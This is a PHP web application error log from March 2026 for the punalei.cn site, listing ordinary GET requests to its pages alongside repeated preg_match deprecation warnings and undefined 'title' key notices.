[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:18:57+08:00 ] 85.11.167.19 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:22:14+08:00 ] 34.61.82.184 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:29:51+08:00 ] 143.198.45.10 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:34:56+08:00 ] 113.215.189.96 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:34:56+08:00 ] 113.215.189.96 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:41:35+08:00 ] 149.86.227.60 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:42:18+08:00 ] 113.215.189.96 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:42:18+08:00 ] 113.215.189.96 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:55:29+08:00 ] 40.77.167.26 GET www.punalei.cn/ldcms/punaleiPNAIdangongnenganguixilie/298.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:55:29+08:00 ] 40.77.167.26 GET www.punalei.cn/ldcms/zhiliudianzuceshiyiPNL2511xilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:10:14+08:00 ] 87.121.84.76 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T04:15:42+08:00 ] 185.242.226.46 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T04:25:48+08:00 ] 220.181.108.145 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T04:36:24+08:00 ] 123.55.166.17 GET www.punalei.cn/ldcms/guanyupunalei.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:36:55+08:00 ] 125.79.173.154 GET www.punalei.cn/ldcms/guanyupunalei.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:37:14+08:00 ] 123.123.97.112 GET www.punalei.cn/ldcms/guanyupunalei.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:45:03+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:45:03+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:47:42+08:00 ] 167.94.138.42 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T04:47:58+08:00 ] 167.94.138.42 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:47:58+08:00 ] 167.94.138.42 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:48:57+08:00 ] 167.94.138.42 GET 120.24.147.77/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:48:57+08:00 ] 167.94.138.42 GET 120.24.147.77/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T04:59:02+08:00 ] 54.242.0.117 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:02:43+08:00 ] 91.231.89.220 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:03:26+08:00 ] 204.76.203.18 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:03:28+08:00 ] 204.76.203.18 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:03:30+08:00 ] 204.76.203.18 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:03:31+08:00 ] 204.76.203.18 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:03:37+08:00 ] 204.76.203.18 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:05:42+08:00 ] 91.231.89.228 GET 120.24.147.77/uploads/20250705/93a02783e7874deb423d980c973e71dc.jpg
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:16:19+08:00 ] 113.215.189.91 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:16:19+08:00 ] 113.215.189.91 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:17:52+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:17:52+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:06+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:06+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:07+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:07+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:19+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:20+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:31+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:33+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:44+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:47+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:59+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
